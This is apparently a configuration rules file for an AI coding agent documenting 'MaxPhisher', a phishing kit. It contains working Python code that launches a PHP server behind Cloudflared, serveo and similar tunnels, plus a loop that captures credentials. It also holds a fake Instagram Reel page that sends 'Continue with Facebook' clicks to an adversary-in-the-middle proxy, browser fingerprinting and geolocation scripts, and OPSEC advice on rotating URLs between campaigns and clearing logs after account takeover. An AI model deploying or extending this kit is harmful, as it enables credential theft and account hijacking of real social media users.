---
trigger: model_decision
description: "TAGS: [redteam,maxphisher,tunneling,cloudflared,php,template] | TRIGGERS: maxphisher,tunnel,cloudflared,localxpose,php,template,local | SCOPE: local-setup | DESCRIPTION: MaxPhisher local setup, tunneling, and template management"
globs:
---
# MaxPhisher Local Setup Module

## Scope
Local development and deployment of MaxPhisher phishing templates with tunneling support.

## Architecture Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                       LOCAL MAXPHISHER SETUP                             │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                          │
│  [maxphisher2.py] ──► [PHP Server] ──► [Cloudflared] ──► [Public URL]   │
│        │                  │                 │                            │
│        ▼                  ▼                 ▼                            │
│  [Menu System]     [.local_maxsites/]  [*.trycloudflare.com]            │
│  [Config]          [Template Files]    [Victim Access]                   │
│                                                                          │
└─────────────────────────────────────────────────────────────────────────┘
```

## Directory Structure

```
~/universal-redteam-rules/core/
├── maxphisher2.py              # Main launcher script
├── impersonator2.py            # Session injection engine
├── master_watcher2.py          # Automated takeover watcher
├── creds.json                  # Captured credentials (JSON format)
├── creds.txt                   # Captured credentials (text format)
└── .local_maxsites/            # Template directory
    └── facebook_evilpanel-maxphisher/
        ├── index.php           # Main landing page (Instagram Reel preview)
        ├── ip.php              # Fingerprint collection + sessions.json
        ├── validate.php        # Bot detection/cloaking (obfuscated)
        ├── shadow_config.php   # OG meta tags for social preview
        ├── save_fingerprint.php# Fingerprint storage
        └── assets/             # Images, CSS, JS
            └── og-image.png    # Social media preview image
```

## maxphisher2.py Core Functions

### Process Initialization
```python
# Kill stale processes before starting
processes = ["php", "cloudflared", "loclx", "localxpose"]

def killer():
    for process in processes:
        if is_running(process):
            output = shell(f"pidof {process}", True).stdout.decode().strip()
            if " " in output:
                for pid in output.split(" "):
                    kill(int(pid), SIGINT)
            elif output != "":
                kill(int(output), SIGINT)
```

### Tunneler Configuration
```python
# Default settings
default_port = 8080
default_tunneler = "Cloudflared"

# Tunneler commands
cf_command = f"{tunneler_dir}/cloudflared"
lx_command = f"{tunneler_dir}/loclx"

ts_commands = {
    "cloudflared": f"{cf_command} tunnel -url {local_url}",
    "localxpose": f"{lx_command} tunnel http -t {local_url}",
    "localhostrun": f"ssh -R 80:{local_url} localhost.run -T -n",
    "serveo": f"ssh -R 80:{local_url} serveo.net -T -n"
}
```

### Server Startup
```python
def server():
    # Start PHP server
    bgtask(f"php -S {local_url}", stdout=php_log, stderr=php_log, cwd=site_dir)
    sleep(2)
    
    # Verify PHP server
    status_code = get(f"http://{local_url}").status_code
    if status_code <= 400:
        print(f"[INFO] PHP Server started successfully!")
    
    # Start tunnelers
    bgtask(f"{cf_command} tunnel -url {local_url}", stdout=cf_log, stderr=cf_log)
    bgtask(f"{lx_command} tunnel --raw-mode http --https-redirect -t {local_url}", stdout=lx_log)
    bgtask(f"ssh -R 80:{local_url} localhost.run -T -n", stdout=lhr_log)
    bgtask(f"ssh -R 80:{local_url} serveo.net -T -n", stdout=svo_log)
    
    # Extract URLs
    sleep(10)
    cf_url = grep("(https://[-0-9a-z.]{4,}.trycloudflare.com)", cf_file)
    lx_url = "https://" + grep("([-0-9a-z.]*.loclx.io)", lx_file)
```

### Credential Capture Loop
```python
def waiter():
    while True:
        # Check for credentials
        if isfile(cred_file):
            timestamp_str = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            userdata = cat(cred_file)
            
            full_entry = f"Timestamp: {timestamp_str}\n{userdata}\n====================\n"
            
            # Display captured data
            show_file_data(cred_file)
            
            # Save to files
            append(full_entry, main_cred)
            append(full_entry, saved_file)
            
            # Save JSON format with timestamp
            json_data = text2json(userdata)
            json_data['Timestamp'] = timestamp_str
            add_json(json_data, cred_json)
            
            # Cleanup
            try:
                remove(cred_file)
            except FileNotFoundError:
                pass
        
        sleep(0.75)
```

## Template Configuration

### index.php - Landing Page
```php
<?php
// AiTM proxy URL from environment
$aitm_url = getenv("EVILPANEL_URL") ?: "https://m.facebook.com/";

// Include components
include "ip.php";  // Fingerprint + sessions.json logging
// validate.php disabled for testing
?>
<!DOCTYPE html>
<html>
<head>
    <!-- Instagram Reel Preview Meta Tags -->
    <meta property="og:site_name" content="Instagram" />
    <meta property="og:title" content="Watch this video on Instagram" />
    <meta property="og:image" content="assets/og-image.png" />
</head>
<body>
    <!-- Preview State → Immersive Video → CTA Button -->
    <button id="ctaButton" class="cta-btn cta-btn-facebook">
        Continue with Facebook
    </button>
    
    <script>
        ctaButton?.addEventListener('click', () => {
            const targetUrl = '<?php echo $aitm_url; ?>';
            
            // Handle in-app browser detection
            const ua = navigator.userAgent || '';
            const isFBWebview = /FBAN|FBAV|FB_IAB/i.test(ua);
            const isMessenger = /Messenger/i.test(ua);
            
            if (isFBWebview || isMessenger) {
                // Show "Open in Browser" modal
                showBrowserModal(targetUrl);
            } else {
                // Direct redirect to AiTM
                window.location.href = targetUrl;
            }
        });
    </script>
</body>
</html>
```

### ip.php - Fingerprint Collection
```php
<?php
// ip.php - v3.0 - Unified Logging & Geo-Triage Engine
error_reporting(0);
date_default_timezone_set("Asia/Manila");

$log_file = 'sessions.json';

// Capture fingerprint from JavaScript
$fingerprint_data = json_decode(file_get_contents('php://input'), true);
$ip_address = $_SERVER['HTTP_CF_CONNECTING_IP'] 
    ?? $_SERVER['HTTP_X_FORWARDED_FOR'] 
    ?? $_SERVER['REMOTE_ADDR'] 
    ?? 'UNKNOWN';

// SessionID validation
$sessionId = $fingerprint_data['sessionId'] ?? 'SERVER_' . bin2hex(random_bytes(16));

// Geo-lookup via ip-api.com
function get_geolocation($ip) {
    $geo_data = @json_decode(@file_get_contents("http://ip-api.com/json/{$ip}"), true);
    if ($geo_data && $geo_data['status'] == 'success') {
        preg_match('/AS(\d+)/', $geo_data['as'] ?? '', $asn_match);
        return [
            'country' => $geo_data['countryCode'] ?? null,
            'region' => $geo_data['regionName'] ?? null,
            'city' => $geo_data['city'] ?? null,
            'zip' => $geo_data['zip'] ?? null,
            'asn' => $asn_match[1] ?? null,
            'isp' => $geo_data['isp'] ?? null,
            'lat' => $geo_data['lat'] ?? null,
            'lon' => $geo_data['lon'] ?? null
        ];
    }
    return null;
}

// Build unified log entry
$log_entry = [
    'sessionId' => $sessionId,
    'timestamp_first_seen' => date('Y-m-d H:i:s'),
    'ip_address' => $ip_address,
    'location' => get_geolocation($ip_address),
    'fingerprint' => $fingerprint_data,
    'credentials' => []  // Populated by login.php
];

// Atomic append to sessions.json
$handle = fopen($log_file, 'c+');
if (flock($handle, LOCK_EX)) {
    // Read, parse, append, write
    $contents = fread($handle, filesize($log_file) ?: 1);
    $data = json_decode($contents, true) ?: [];
    $data[] = $log_entry;
    ftruncate($handle, 0);
    rewind($handle);
    fwrite($handle, json_encode($data, JSON_PRETTY_PRINT));
    flock($handle, LOCK_UN);
}
fclose($handle);
?>
```

### JavaScript Fingerprint Collection
```javascript
(function() {
    'use strict';
    const sessionId = 'FP_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);

    async function collectFingerprint() {
        const fingerprint = {};
        
        // Browser properties
        fingerprint.userAgent = navigator.userAgent;
        fingerprint.language = navigator.language;
        fingerprint.languages = navigator.languages;
        fingerprint.platform = navigator.platform;
        fingerprint.hardwareConcurrency = navigator.hardwareConcurrency;
        fingerprint.deviceMemory = navigator.deviceMemory;
        fingerprint.devicePixelRatio = window.devicePixelRatio;
        
        // Screen properties
        fingerprint.screenResolution = `${screen.width}x${screen.height}`;
        fingerprint.screenAvailWidth = screen.availWidth;
        fingerprint.screenAvailHeight = screen.availHeight;
        fingerprint.colorDepth = screen.colorDepth;
        
        // Timezone
        fingerprint.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        fingerprint.touchSupport = navigator.maxTouchPoints;
        
        // Battery API
        if ('getBattery' in navigator) {
            const battery = await navigator.getBattery();
            fingerprint.batteryLevel = battery.level;
            fingerprint.batteryCharging = battery.charging;
        }
        
        // Connection API
        if (navigator.connection) {
            fingerprint.connectionType = navigator.connection.effectiveType;
            fingerprint.connectionDownlink = navigator.connection.downlink;
        }
        
        // WebGL
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl');
        if (gl) {
            fingerprint.webGLRenderer = gl.getParameter(gl.RENDERER);
            fingerprint.webGLVendor = gl.getParameter(gl.VENDOR);
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                fingerprint.webGLUnmaskedRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                fingerprint.webGLUnmaskedVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            }
        }
        
        // Orientation
        if (screen.orientation) {
            fingerprint.orientationType = screen.orientation.type;
            fingerprint.orientationAngle = screen.orientation.angle;
        }
        
        fingerprint.sessionId = sessionId;
        return fingerprint;
    }

    collectFingerprint().then(fp => {
        fetch('ip.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(fp)
        });
    });
})();
```

## Environment Variables

```bash
# Required for AiTM integration
export EVILPANEL_URL="https://your-aitm-domain.com/"

# Optional: Shadow URL for OG preview
export SHADOW_URL="https://www.instagram.com/reel/xxx"

# MaxPhisher sessions file location
export MAXPHISHER_SESSIONS_FILE="/home/user/.site/sessions.json"
```

## CLI Usage

### Basic Launch
```bash
cd ~/universal-redteam-rules/core
python3 maxphisher2.py
```

### With Arguments
```bash
python3 maxphisher2.py \
  --port 8080 \
  --tunneler Cloudflared \
  --type 2 \
  --option 1 \
  --noupdate
```

### Non-Interactive Mode
```bash
# Set environment for non-interactive
export SHADOW_URL="https://instagram.com/reel/xxx"

python3 maxphisher2.py \
  --type 2 \
  --option 1 \
  --mode test
```

## Credential Watcher Integration

```bash
# Terminal 1: Run MaxPhisher
cd ~/universal-redteam-rules/core
python3 maxphisher2.py

# Terminal 2: Run Master Watcher
python3 master_watcher2.py

# Terminal 3: Monitor credentials
watch -n 1 "cat ~/.site/sessions.json | jq '.[-1]'"
```

## Output Files

| File | Location | Format | Purpose |
|------|----------|--------|---------|
| sessions.json | ~/.site/ | JSON | Unified fingerprint + credentials log |
| creds.json | core/ | JSON | Credentials array |
| creds.txt | core/ | Text | Human-readable credentials |
| php.log | ~/.tunneler/ | Text | PHP server output |
| cf.log | ~/.tunneler/ | Text | Cloudflared output |

## OPSEC Requirements

1. **Template Updates**: Always pull latest from repo before deployment
2. **Tunneler Rotation**: Rotate Cloudflared URLs between campaigns
3. **Log Cleanup**: Clear sessions.json after successful takeover
4. **VPS Sync**: Sync templates to VPS before going live
